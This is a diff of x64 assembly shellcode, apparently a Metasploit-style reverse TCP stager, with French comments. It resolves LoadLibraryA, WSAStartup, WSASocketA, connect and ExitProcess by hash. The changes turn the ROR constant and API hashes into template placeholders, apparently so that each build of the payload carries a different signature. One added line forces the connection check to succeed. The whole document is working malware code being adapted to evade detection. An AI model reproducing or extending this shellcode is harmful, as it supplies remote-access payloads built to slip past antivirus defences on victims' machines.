@@ -28,7 +28,7 @@ module_hash_loop:
     jl skip_case_adjustment
     sub al,0x20
 skip_case_adjustment:
-    ror r9d,0xd
+    ror r9d,%ROR_VALUE%
     add r9d,eax
     loop module_hash_loop
 
@@ -60,7 +60,7 @@ find_function:
 
 function_hash_loop:
     xor rax,rax
-    ror r9d,0xd
+    ror r9d,%ROR_VALUE%
     lodsb
     add r9d,eax
     cmp al,ah
@@ -102,7 +102,7 @@ load_next_module:
 
 save_beginning:
     pop rbp      ; rbp = @->beginning (metasploit_block_api)
-    mov r14,0x32335f327377
+    mov r14,0x32335f327377 ; Chaine de caractere "ws2_32"
     push r14
     mov r14,rsp  ; @ -> chaine au dessus
     sub rsp,0x1a0
@@ -111,12 +111,12 @@ save_beginning:
     push r12
     mov r12,rsp
     mov rcx,r14
-    mov r10d,0x726774c   ; Hash de kernel32.LoadLibraryA 
+    mov r10d,%HASH-kernel32.dll-LoadLibraryA% ; jump sur kernel32.LoadLibraryA("ws2_32")
     call rbp             ; Premiere run de l'api
     mov rdx,r13
     push qword 0x101
     pop rcx
-    mov r10d,0x6b8029   ; Hash de ???
+    mov r10d,%HASH-ws2_32.dll-WSAStartup%   ; ws2_32.WSAStartup(0x101,WSADATA) (arguments à voir)
     call rbp            ; 2eme run
     push byte +0xa
     pop r14
@@ -130,21 +130,22 @@ to_rename_11f:
     mov rdx,rax
     inc rax
     mov rcx,rax
-    mov r10d,0xe0df0fea ; Hash de ???
-    call rbp            ; 3eme run  XXX.YYYY(
+    mov r10d,%HASH-ws2_32.dll-WSASocketA% ; ws2_32.WSASocketA(0x2,0x1,0x0,0x0,?,0x1)
+    call rbp            ; 3eme run 
     mov rdi,rax
 
 to_rename_13e:
     push byte +0x10
     pop r8
     mov rdx,r12
-     mov rcx,rdi
-    mov r10d,0x6174a599 ; Hash de ???
+    mov rcx,rdi
+    mov r10d,%HASH-ws2_32.dll-connect% ; ws2_32.connect(0xD0,?,0x10)
     call rbp            ; 4eme run
+    xor eax,eax       ; PATCH TO REMOVE
     test eax,eax
-    jz to_rename_15e
+    jz to_rename_15e   ; Si connexion TCP réussie on continue
     dec r14
-    jnz to_rename_13e
+    jnz to_rename_13e  ; Sinon on recommence
     call to_rename_1f1
 
 to_rename_15e:
@@ -207,5 +208,5 @@ to_rename_1f1:
     pop rax
     push byte +0x0
     pop rcx
-    mov r10,0x56a2b5f0 ; Hash de kernel32.ExitProcess
-    call rbp           ; 10eme run
+    mov r10,%HASH-kernel32.dll-ExitProcess% 
+    call rbp                                 ; 10eme run
